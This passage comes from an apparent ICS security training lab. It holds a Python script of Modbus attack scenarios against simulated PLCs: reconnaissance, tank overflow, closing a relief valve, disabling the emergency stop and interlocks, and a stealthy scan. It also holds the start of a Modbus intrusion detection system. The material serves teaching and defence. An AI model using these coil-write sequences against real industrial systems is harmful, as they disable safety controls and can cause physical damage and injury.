
    Learning Goals:
    - Understand ICS network discovery
    - Learn Modbus port scanning
    - Practice fingerprinting PLCs
    """
    print(f"\n{Color.HEADER}{'â•'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 1: Reconnaissance - System Discovery{Color.END}")
    print(f"{Color.HEADER}{'â•'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Discover active PLCs on the network")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.GREEN}Beginner{Color.END}")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0840 - Network Connection Enumeration\n")

    attacker = ModbusAttacker()

    print(f"{Color.CYAN}[*] Scanning for Modbus TCP devices...{Color.END}\n")

    discovered = []
    for plc_name, port in attacker.ports.items():
        try:
            sock = socket.socket()
            sock.settimeout(1)
            sock.connect((attacker.host, port))
            sock.close()
            discovered.append((plc_name, port))
            print(f"  {Color.GREEN}âœ“{Color.END} Found {plc_name} on port {port}")
        except:
            print(f"  {Color.RED}âœ—{Color.END} No response on port {port}")

    print(f"\n{Color.BOLD}Results:{Color.END}")
    print(f"  Discovered {len(discovered)} active PLCs")
    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  â€¢ Port scanning activity detected")
    print(f"  â€¢ Multiple connection attempts logged")
    print(f"  â€¢ IDS should flag reconnaissance behavior")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SCENARIO 2: Tank Overflow Attack (PLC-1)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def scenario_tank_overflow():
    """
    SCENARIO: Tank Overflow Attack

    Objective: Cause tank overflow by manipulating pump and valve controls
    Difficulty: Intermediate
    Attack Type: Process Manipulation
    Target: PLC-1 (Tank Control System)

    Real-World Parallel: Similar to attacks on water treatment facilities
    """
    print(f"\n{Color.HEADER}{'â•'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 2: Tank Overflow Attack (PLC-1){Color.END}")
    print(f"{Color.HEADER}{'â•'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Cause tank overflow")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.YELLOW}Intermediate{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} PLC-1 (Tank Control System)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0836 - Modify Parameter\n")

    print(f"{Color.BOLD}Attack Scenario:{Color.END}")
    print(f"  1. Turn ON pump (coil 0) â†’ Fill tank")
    print(f"  2. Close outlet valve (coil 3) â†’ Prevent drainage")
    print(f"  3. Result: Tank level rises uncontrollably\n")

    attacker = ModbusAttacker()

    input(f"{Color.CYAN}Press Enter to execute attack...{Color.END}")

    print(f"\n{Color.RED}[!] Executing Tank Overflow Attack...{Color.END}\n")

    # Step 1: Enable pump
    print(f"  {Color.CYAN}[1/2]{Color.END} Turning ON pump (coil 0)...")
    success = attacker.write_coil(5502, 0, True, "Pump ON")
    print(f"  {'âœ“' if success else 'âœ—'} Pump control: {'SUCCESS' if success else 'FAILED'}")
    time.sleep(1)

    # Step 2: Close outlet valve
    print(f"  {Color.CYAN}[2/2]{Color.END} Closing outlet valve (coil 3)...")
    success = attacker.write_coil(5502, 3, False, "Valve closed")
    print(f"  {'âœ“' if success else 'âœ—'} Valve control: {'SUCCESS' if success else 'FAILED'}")

    print(f"\n{Color.RED}[!] Tank Overflow Attack Complete!{Color.END}")
    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  â€¢ Tank level rises uncontrollably")
    print(f"  â€¢ High-level alarms triggered")
    print(f"  â€¢ Potential physical damage to tank")
    print(f"  â€¢ Production downtime")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  â€¢ Write operations to critical coils")
    print(f"  â€¢ Abnormal process values detected")
    print(f"  â€¢ Safety system alarms")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SCENARIO 3: Pressure Vessel Rupture (PLC-2)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def scenario_pressure_rupture():
    """
    SCENARIO: Pressure Vessel Rupture Attack

    Objective: Over-pressurize vessel by disabling safety controls
    Difficulty: Advanced
    Attack Type: Safety System Sabotage
    Target: PLC-2 (Pressure Control System)

    Real-World Parallel: Similar to Triton/TRISIS attack on safety systems
    """
    print(f"\n{Color.HEADER}{'â•'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 3: Pressure Vessel Rupture Attack (PLC-2){Color.END}")
    print(f"{Color.HEADER}{'â•'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Over-pressurize vessel")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.RED}Advanced{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} PLC-2 (Pressure Control System)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0816 - Device Restart/Shutdown\n")

    print(f"{Color.BOLD}Attack Scenario:{Color.END}")
    print(f"  1. Enable compressor (coil 0) â†’ Increase pressure")
    print(f"  2. Close relief valve (coil 4) â†’ Disable safety relief")
    print(f"  3. Result: Pressure builds beyond safe limits\n")

    attacker = ModbusAttacker()

    input(f"{Color.CYAN}Press Enter to execute attack...{Color.END}")

    print(f"\n{Color.RED}[!] Executing Pressure Rupture Attack...{Color.END}\n")

    # Step 1: Enable compressor
    print(f"  {Color.CYAN}[1/2]{Color.END} Enabling compressor (coil 0)...")
    success = attacker.write_coil(5503, 0, True, "Compressor ON")
    print(f"  {'âœ“' if success else 'âœ—'} Compressor control: {'SUCCESS' if success else 'FAILED'}")
    time.sleep(1)

    # Step 2: Close relief valve
    print(f"  {Color.CYAN}[2/2]{Color.END} Closing relief valve (coil 4)...")
    success = attacker.write_coil(5503, 4, False, "Relief valve closed")
    print(f"  {'âœ“' if success else 'âœ—'} Relief valve control: {'SUCCESS' if success else 'FAILED'}")

    print(f"\n{Color.RED}[!] Pressure Rupture Attack Complete!{Color.END}")
    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  â€¢ {Color.RED}CRITICAL:{Color.END} Pressure exceeds safe limits")
    print(f"  â€¢ Risk of vessel rupture/explosion")
    print(f"  â€¢ Safety systems bypassed")
    print(f"  â€¢ Potential for casualties")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  â€¢ CRITICAL alerts for safety system tampering")
    print(f"  â€¢ Relief valve closure during high pressure")
    print(f"  â€¢ Emergency shutdown procedures triggered")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SCENARIO 4: Temperature Stress Attack (PLC-3)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def scenario_temperature_stress():
    """
    SCENARIO: Thermal Stress Attack

    Objective: Cause equipment damage through thermal cycling
    Difficulty: Intermediate
    Attack Type: Equipment Degradation
    Target: PLC-3 (Temperature Control System)

    Real-World Parallel: Stuxnet-style equipment degradation
    """
    print(f"\n{Color.HEADER}{'â•'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 4: Thermal Stress Attack (PLC-3){Color.END}")
    print(f"{Color.HEADER}{'â•'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Cause equipment damage via thermal cycling")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.YELLOW}Intermediate{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} PLC-3 (Temperature Control System)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0879 - Damage to Property\n")

    print(f"{Color.BOLD}Attack Scenario:{Color.END}")
    print(f"  1. Rapid heating/cooling cycles")
    print(f"  2. Causes thermal stress on equipment")
    print(f"  3. Result: Accelerated equipment degradation\n")

    attacker = ModbusAttacker()

    input(f"{Color.CYAN}Press Enter to execute attack (3 cycles)...{Color.END}")

    print(f"\n{Color.RED}[!] Executing Thermal Stress Attack...{Color.END}\n")

    for cycle in range(3):
        print(f"{Color.BOLD}Cycle {cycle + 1}/3:{Color.END}")

        # Heat
        print(f"  {Color.CYAN}[â†’]{Color.END} Enabling heater (coil 0)...")
        attacker.write_coil(5504, 0, True, "Heater ON")
        print(f"  {Color.RED}[HOT]{Color.END} Temperature rising...")
        time.sleep(2)

        # Cool
        print(f"  {Color.CYAN}[â†’]{Color.END} Enabling cooler (coil 2)...")
        attacker.write_coil(5504, 2, True, "Cooler ON")
        print(f"  {Color.BLUE}[COLD]{Color.END} Temperature dropping...")
        time.sleep(2)
        print()

    print(f"{Color.RED}[!] Thermal Stress Attack Complete!{Color.END}")
    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  â€¢ Thermal shock to equipment")
    print(f"  â€¢ Accelerated wear and tear")
    print(f"  â€¢ Reduced equipment lifespan")
    print(f"  â€¢ Maintenance costs increase")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  â€¢ Abnormal temperature fluctuations")
    print(f"  â€¢ Rapid setpoint changes")
    print(f"  â€¢ Process deviation alarms")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SCENARIO 5: Safety System Shutdown (PLC-4)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def scenario_safety_shutdown():
    """
    SCENARIO: Emergency Safety System Disable

    Objective: Disable emergency shutdown capabilities
    Difficulty: Expert
    Attack Type: Safety System Compromise
    Target: PLC-4 (Safety/Emergency Shutdown System)

    Real-World Parallel: Triton/TRISIS attack methodology
    """
    print(f"\n{Color.HEADER}{'â•'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 5: Emergency Safety System Disable (PLC-4){Color.END}")
    print(f"{Color.HEADER}{'â•'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Disable emergency safety controls")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.RED}{Color.BOLD}Expert{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} PLC-4 (Safety/Emergency Shutdown System)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0816 - Device Restart/Shutdown\n")

    print(f"{Color.BOLD}Attack Scenario:{Color.END}")
    print(f"  1. Disable emergency stop (coil 0)")
    print(f"  2. Disable safety interlock (coil 1)")
    print(f"  3. Result: No safety systems to prevent catastrophe\n")

    print(f"{Color.RED}{Color.BOLD}âš ï¸  WARNING: This is the most dangerous attack!{Color.END}")
    print(f"{Color.RED}   Disabling safety systems can lead to catastrophic failure.{Color.END}\n")

    attacker = ModbusAttacker()

    confirm = input(f"{Color.YELLOW}Type 'CONFIRM' to execute this critical attack: {Color.END}")

    if confirm != "CONFIRM":
        print(f"\n{Color.GREEN}[âœ“] Attack cancelled. Good judgment!{Color.END}")
        return

    print(f"\n{Color.RED}[!] Executing Safety System Disable Attack...{Color.END}\n")

    # Disable E-stop
    print(f"  {Color.CYAN}[1/2]{Color.END} Disabling emergency stop (coil 0)...")
    success = attacker.write_coil(5505, 0, False, "E-stop disabled")
    print(f"  {Color.RED}âœ—{Color.END} Emergency stop: {'DISABLED' if success else 'FAILED'}")
    time.sleep(1)

    # Disable interlock
    print(f"  {Color.CYAN}[2/2]{Color.END} Disabling safety interlock (coil 1)...")
    success = attacker.write_coil(5505, 1, False, "Interlock disabled")
    print(f"  {Color.RED}âœ—{Color.END} Safety interlock: {'DISABLED' if success else 'FAILED'}")

    print(f"\n{Color.RED}{Color.BOLD}[!!!] SAFETY SYSTEMS DISABLED [!!!]{Color.END}")
    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  â€¢ {Color.RED}{Color.BOLD}CRITICAL:{Color.END} No emergency stop capability")
    print(f"  â€¢ {Color.RED}{Color.BOLD}CRITICAL:{Color.END} Safety interlocks bypassed")
    print(f"  â€¢ Plant cannot be safely shut down")
    print(f"  â€¢ Other attacks now more dangerous")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  â€¢ {Color.RED}MAXIMUM PRIORITY ALERT{Color.END}")
    print(f"  â€¢ Safety system tampering detected")
    print(f"  â€¢ Immediate incident response required")
    print(f"  â€¢ Consider emergency plant shutdown")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SCENARIO 6: Multi-Stage Advanced Persistent Threat (APT)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def scenario_apt_campaign():
    """
    SCENARIO: Multi-Stage APT Campaign

    Objective: Execute coordinated attack across all PLCs
    Difficulty: Expert
    Attack Type: Advanced Persistent Threat
    Target: All PLCs (Coordinated Attack)

    Real-World Parallel: Nation-state APT campaigns
    """
    print(f"\n{Color.HEADER}{'â•'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 6: Multi-Stage APT Campaign{Color.END}")
    print(f"{Color.HEADER}{'â•'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Coordinated attack across all systems")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.RED}{Color.BOLD}Expert{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} All PLCs (System-Wide)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} Multiple Techniques\n")

    print(f"{Color.BOLD}Attack Timeline:{Color.END}")
    print(f"  Phase 1: Disable safety systems (PLC-4)")
    print(f"  Phase 2: Overflow tank (PLC-1)")
    print(f"  Phase 3: Over-pressurize (PLC-2)")
    print(f"  Phase 4: Thermal damage (PLC-3)")
    print(f"  Result: Cascading system failure\n")

    attacker = ModbusAttacker()

    confirm = input(f"{Color.RED}{Color.BOLD}Type 'EXECUTE APT' to begin coordinated attack: {Color.END}")

    if confirm != "EXECUTE APT":
        print(f"\n{Color.GREEN}[âœ“] APT campaign cancelled.{Color.END}")
        return

    print(f"\n{Color.RED}[!] Initiating Multi-Stage APT Campaign...{Color.END}\n")

    # Phase 1: Disable safety
    print(f"{Color.BOLD}PHASE 1: Disabling Safety Systems...{Color.END}")
    attacker.write_coil(5505, 0, False, "E-stop OFF")
    attacker.write_coil(5505, 1, False, "Interlock OFF")
    print(f"  {Color.RED}âœ—{Color.END} PLC-4 safety systems disabled")
    time.sleep(2)

    # Phase 2: Tank overflow
    print(f"\n{Color.BOLD}PHASE 2: Initiating Tank Overflow...{Color.END}")
    attacker.write_coil(5502, 0, True, "Pump ON")
    attacker.write_coil(5502, 3, False, "Valve closed")
    print(f"  {Color.YELLOW}âš {Color.END}  PLC-1 tank overflow in progress")
    time.sleep(2)

    # Phase 3: Pressure attack
    print(f"\n{Color.BOLD}PHASE 3: Over-Pressurizing System...{Color.END}")
    attacker.write_coil(5503, 0, True, "Compressor ON")
    attacker.write_coil(5503, 4, False, "Relief closed")
    print(f"  {Color.RED}âš {Color.END}  PLC-2 pressure building dangerously")
    time.sleep(2)

    # Phase 4: Thermal stress
    print(f"\n{Color.BOLD}PHASE 4: Initiating Thermal Stress...{Color.END}")
    attacker.write_coil(5504, 0, True, "Heater ON")
    attacker.write_coil(5504, 2, True, "Cooler ON")
    print(f"  {Color.YELLOW}âš {Color.END}  PLC-3 thermal stress initiated")

    print(f"\n{Color.RED}{Color.BOLD}{'â•'*71}{Color.END}")
    print(f"{Color.RED}{Color.BOLD}[!!!] APT CAMPAIGN COMPLETE - SYSTEM FAILURE IMMINENT [!!!]{Color.END}")
    print(f"{Color.RED}{Color.BOLD}{'â•'*71}{Color.END}")

    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  â€¢ Complete loss of safety systems")
    print(f"  â€¢ Multiple simultaneous process failures")
    print(f"  â€¢ Cascading equipment damage")
    print(f"  â€¢ Potential for catastrophic incident")
    print(f"  â€¢ Extended recovery time (days/weeks)")

    print(f"\n{Color.YELLOW}[!] Blue Team Response:{Color.END}")
    print(f"  â€¢ Declare security incident")
    print(f"  â€¢ Emergency plant shutdown")
    print(f"  â€¢ Isolate OT network from IT")
    print(f"  â€¢ Begin forensic investigation")
    print(f"  â€¢ Notify authorities/regulatory bodies")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SCENARIO 7: Stealthy Reconnaissance with Minimal Footprint
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def scenario_stealthy_recon():
    """
    SCENARIO: Stealthy Reconnaissance

    Objective: Gather intelligence without triggering alarms
    Difficulty: Intermediate
    Attack Type: Covert Intelligence Gathering

    Learning: How attackers avoid detection during reconnaissance
    """
    print(f"\n{Color.HEADER}{'â•'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 7: Stealthy Reconnaissance{Color.END}")
    print(f"{Color.HEADER}{'â•'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Gather system information covertly")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.YELLOW}Intermediate{Color.END}")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0888 - Remote System Information Discovery\n")

    print(f"{Color.BOLD}Stealth Techniques:{Color.END}")
    print(f"  â€¢ Slow scanning (avoid rate-based detection)")
    print(f"  â€¢ Read-only operations (no process changes)")
    print(f"  â€¢ Randomized timing (avoid pattern detection)")
    print(f"  â€¢ Legitimate-looking requests\n")

    attacker = ModbusAttacker()

    input(f"{Color.CYAN}Press Enter to begin stealthy reconnaissance...{Color.END}")

    print(f"\n{Color.CYAN}[*] Conducting stealthy reconnaissance...{Color.END}\n")

    for plc_name, port in attacker.ports.items():
        wait_time = random.uniform(3, 8)
        print(f"  {Color.CYAN}[â†’]{Color.END} Probing {plc_name}...")
        time.sleep(wait_time)

        try:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((attacker.host, port))
            sock.close()
            print(f"      {Color.GREEN}âœ“{Color.END} {plc_name} active on port {port} (waited {wait_time:.1f}s)")
        except:
            print(f"      {Color.RED}âœ—{Color.END} No response")

    print(f"\n{Color.GREEN}[âœ“] Reconnaissance Complete{Color.END}")
    print(f"\n{Color.BOLD}Intelligence Gathered:{Color.END}")
    print(f"  â€¢ Network topology mapped")
    print(f"  â€¢ PLC types identified")
    print(f"  â€¢ Attack surface analyzed")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  â€¢ {Color.GREEN}LOW{Color.END} - Stealthy approach reduces detection")
    print(f"  â€¢ Slow scan may blend with normal traffic")
    print(f"  â€¢ Long-term behavioral analysis needed")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Main Menu
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def print_menu():
    print(f"\n{Color.BOLD}{Color.CYAN}{'â•'*71}{Color.END}")
    print(f"{Color.BOLD}{Color.CYAN}ICS/SCADA ATTACK TRAINING SCENARIOS{Color.END}")
    print(f"{Color.BOLD}{Color.CYAN}{'â•'*71}{Color.END}\n")

    print(f"{Color.BOLD}Choose a training scenario:{Color.END}\n")

    scenarios = [
        ("1", "Reconnaissance - System Discovery", "Beginner", Color.GREEN),
        ("2", "Tank Overflow Attack (PLC-1)", "Intermediate", Color.YELLOW),
        ("3", "Pressure Vessel Rupture (PLC-2)", "Advanced", Color.RED),
        ("4", "Thermal Stress Attack (PLC-3)", "Intermediate", Color.YELLOW),
        ("5", "Safety System Shutdown (PLC-4)", "Expert", Color.RED),
        ("6", "Multi-Stage APT Campaign", "Expert", Color.RED),
        ("7", "Stealthy Reconnaissance", "Intermediate", Color.YELLOW),
    ]

    for num, name, difficulty, color in scenarios:
        print(f"  {Color.BOLD}[{num}]{Color.END} {name}")
        print(f"      Difficulty: {color}{difficulty}{Color.END}\n")

    print(f"  {Color.BOLD}[0]{Color.END} Exit\n")


def main():
    print(f"\n{Color.BOLD}{'â•'*71}{Color.END}")
    print(f"{Color.BOLD}Vuln-PLC Training Scenarios{Color.END}")
    print(f"{Color.BOLD}For Educational Purposes Only{Color.END}")
    print(f"{Color.BOLD}{'â•'*71}{Color.END}")

    scenarios = {
        '1': scenario_reconnaissance,
        '2': scenario_tank_overflow,
        '3': scenario_pressure_rupture,
        '4': scenario_temperature_stress,
        '5': scenario_safety_shutdown,
        '6': scenario_apt_campaign,
        '7': scenario_stealthy_recon,
    }

    while True:
        print_menu()
        choice = input(f"{Color.CYAN}Select scenario: {Color.END}").strip()

        if choice == '0':
            print(f"\n{Color.GREEN}Training session ended.{Color.END}\n")
            break
        elif choice in scenarios:
            scenarios[choice]()
            input(f"\n{Color.CYAN}Press Enter to return to menu...{Color.END}")
        else:
            print(f"\n{Color.RED}Invalid choice. Please try again.{Color.END}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Color.YELLOW}Training interrupted by user.{Color.END}\n")



================================================================================
FILE: monitoring/modbus_ids.py
================================================================================
#!/usr/bin/env python3
"""
Modbus Intrusion Detection System (IDS)
Monitors Modbus TCP traffic for anomalies and suspicious patterns

Detection capabilities:
- Unexpected function codes
- Out-of-range register/coil addresses
- Rapid-fire commands (flooding)
- Unauthorized write attempts
- Timing anomalies
- Command sequence violations
"""

import time
import threading
import logging
import os
import sys
from collections import defaultdict, deque
from dataclasses import dataclass
from typing import Dict, List, Tuple, Optional
from datetime import datetime
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from core import shared_state

# PCAP capture support
try:
    from scapy.all import sniff, wrpcap, TCP, IP, Raw
    from scapy.layers.inet import Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy not available - PCAP capture disabled. Install with: pip install scapy")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

@dataclass
class ModbusEvent:
    """Single Modbus event"""
    timestamp: float
    source_ip: str
    dest_ip: str
    function_code: int
    address: int
    value: Optional[int] = None
    unit_id: int = 1

@dataclass
class Alert:
    """IDS Alert"""
    timestamp: float
    severity: str  # LOW, MEDIUM, HIGH, CRITICAL
    alert_type: str
    description: str
    source_ip: str
    details: Dict

class ModbusIDS:
    """
    Modbus TCP Intrusion Detection System

    Detection methods:
    - Signature-based: Known attack patterns
    - Anomaly-based: Statistical deviations from baseline
    - Policy-based: Violations of defined rules
    """

    # Legitimate function codes
    LEGITIMATE_FUNCTION_CODES = {
        1,   # Read Coils
        2,   # Read Discrete Inputs
        3,   # Read Holding Registers
        4,   # Read Input Registers
        5,   # Write Single Coil
        6,   # Write Single Register
        15,  # Write Multiple Coils
        16,  # Write Multiple Registers
        23,  # Read/Write Multiple Registers
    }

    # Critical function codes (require elevated permissions)
    CRITICAL_FUNCTION_CODES = {
        6,   # Write Single Register
        15,  # Write Multiple Coils
        16,  # Write Multiple Registers
    }

    def __init__(self, pcap_dir: str = '/app/pcaps', enable_pcap: bool = True):
        self.enabled = True
        self.alerts: deque = deque(maxlen=1000)  # Keep last 1000 alerts

        # Baseline traffic statistics
        self.baseline = {
            'function_codes': defaultdict(int),
            'source_ips': defaultdict(int),
            'hourly_counts': defaultdict(int),
        }

        # Recent events for pattern detection
        self.recent_events: deque = deque(maxlen=100)

        # Rate limiting tracking
        self.rate_tracker: Dict[str, deque] = defaultdict(lambda: deque(maxlen=100))

        # Policy rules
        self.authorized_writers = set()  # IPs allowed to write
        self.protected_addresses = set()  # Critical registers

        # Background monitoring
        self.running = False
        self.thread = None

        # PCAP capture configuration
        self.pcap_enabled = enable_pcap and SCAPY_AVAILABLE
        self.pcap_dir = pcap_dir
        self.packet_buffer = []
        self.capture_thread = None
        self.capture_running = False
        self.current_pcap_file = None
        self.packets_captured = 0
        self.pcap_rotation_size = 100 * 1024 * 1024  # 100MB
        self.pcap_rotation_interval = 3600  # 1 hour
        self.last_pcap_rotation = time.time()

        # Create PCAP directory
        if self.pcap_enabled:
            os.makedirs(pcap_dir, exist_ok=True)
            log.info(f"[Modbus IDS] PCAP capture enabled, saving to {pcap_dir}")
        else:
            if not SCAPY_AVAILABLE:
                log.warning("[Modbus IDS] PCAP capture disabled - scapy not available")

        shared_state.init_state()

    def start(self):
        """Start IDS monitoring"""
        if self.running:
            return

        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()

        # Start PCAP capture
        if self.pcap_enabled:
            self.start_packet_capture()

        log.info("[Modbus IDS] Started monitoring")

    def stop(self):
        """Stop IDS monitoring"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2.0)

        # Stop PCAP capture
        if self.pcap_enabled:
            self.stop_packet_capture()

        log.info("[Modbus IDS] Stopped monitoring")

    def analyze_event(self, event: ModbusEvent) -> List[Alert]:
        """
        Analyze a Modbus event for suspicious activity
        Returns list of alerts (can be empty)
        """
        alerts = []

        # Add to recent events
        self.recent_events.append(event)

        # Update baseline
        self.baseline['function_codes'][event.function_code] += 1
        self.baseline['source_ips'][event.source_ip] += 1

        # Detection checks
        alerts.extend(self._check_invalid_function_code(event))
        alerts.extend(self._check_unauthorized_write(event))
        alerts.extend(self._check_protected_address(event))
        alerts.extend(self._check_rate_limiting(event))
        alerts.extend(self._check_scan_pattern(event))
        alerts.extend(self._check_timing_anomaly(event))

        # Store alerts
        for alert in alerts:
            self.alerts.append(alert)
            self._log_alert(alert)

        return alerts

    def _check_invalid_function_code(self, event: ModbusEvent) -> List[Alert]:
        """Detect invalid or unusual function codes"""
        alerts = []

        if event.function_code not in self.LEGITIMATE_FUNCTION_CODES:
            alerts.append(Alert(
                timestamp=event.timestamp,
                severity='HIGH',
                alert_type='INVALID_FUNCTION_CODE',
                description=f'Invalid Modbus function code: {event.function_code}',
                source_ip=event.source_ip,
                details={'function_code': event.function_code}
            ))

        return alerts

    def _check_unauthorized_write(self, event: ModbusEvent) -> List[Alert]:
        """Detect write attempts from unauthorized sources"""
        alerts = []

        if event.function_code in self.CRITICAL_FUNCTION_CODES:
            if self.authorized_writers and event.source_ip not in self.authorized_writers:
                alerts.append(Alert(
                    timestamp=event.timestamp,
                    severity='CRITICAL',
                    alert_type='UNAUTHORIZED_WRITE',
                    description=f'Unauthorized write attempt from {event.source_ip}',
                    source_ip=event.source_ip,
                    details={
                        'function_code': event.function_code,
                        'address': event.address,
                        'value': event.value
                    }
                ))

        return alerts

    def _check_protected_address(self, event: ModbusEvent) -> List[Alert]:
        """Detect access to protected/critical addresses"""
        alerts = []

        if event.address in self.protected_addresses:
            if event.function_code in self.CRITICAL_FUNCTION_CODES:
                alerts.append(Alert(
                    timestamp=event.timestamp,
                    severity='CRITICAL',
                    alert_type='PROTECTED_ADDRESS_WRITE',
                    description=f'Write to protected address {event.address}',
                    source_ip=event.source_ip,
                    details={
                        'address': event.address,
